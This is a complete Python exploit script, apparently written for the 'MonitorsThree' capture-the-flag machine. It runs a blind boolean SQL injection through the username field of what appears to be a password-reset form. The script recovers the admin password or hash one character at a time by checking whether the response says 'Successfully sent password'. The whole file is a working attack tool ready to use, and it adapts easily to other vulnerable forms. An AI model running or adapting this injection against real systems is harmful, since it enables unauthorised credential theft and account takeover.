#!/usr/bin/python3
import argparse
import requests
import string
from sys import exit as sys_exit
from pwn import log


# Characters for the possible password/password hash
charlist: list[str] = list(string.ascii_letters + string.digits + '!@#$%^&*()')


def get_argument()->argparse.Namespace:
    """
    Get arguments from user
    """
    parser = argparse.ArgumentParser(description='MonitorsThree SQL Injection.')
    parser.add_argument('url', type=str, help='Injection URL')
    return parser.parse_args()


def text_to_inject(len_password: int, char_to_inject: str)->str:
    """
    SQL Injection to check password char by char
    """
    return f"admin' AND SUBSTR(password,{len_password},1)='{char_to_inject}' -- -"


def make_http_request(url: str)->str|None:
    """
    HTTP Request with SQL Injection
    """
    password: str = ''
    p1 = log.progress('Extracting info')
    p2 = log.progress('Password')
    while True:
        for char in charlist:
            p1.status(f"Attempting request with character {char!r}")
            len_password = len(password)
            data = {'username' : text_to_inject(len_password+1, char)}
            r = requests.post(url, data)
            if (r.status_code != 200) and (r.status_code != 302):
                p1.failure(f"Invalid HTTP status code {r.status_code!r}")
                p2.failure("Password could not be found")
                sys_exit(1)
            if 'Successfully sent password' in r.text:
                password += char
                p2.status(password)
                break
        else:
            break
    if password == '':
        p1.failure(f"Attempted everything and failed")
        p2.failure("Password could not be found")
        sys_exit(1)
    p1.success(f"Password found: {password}")
    p2.success(f"Password length: {len(password)}")
    return


def main()->None:
    # Get argument from user
    args = get_argument()
    # Start the SQL injection against the target
    make_http_request(args.url)


if __name__ == "__main__":
    main()
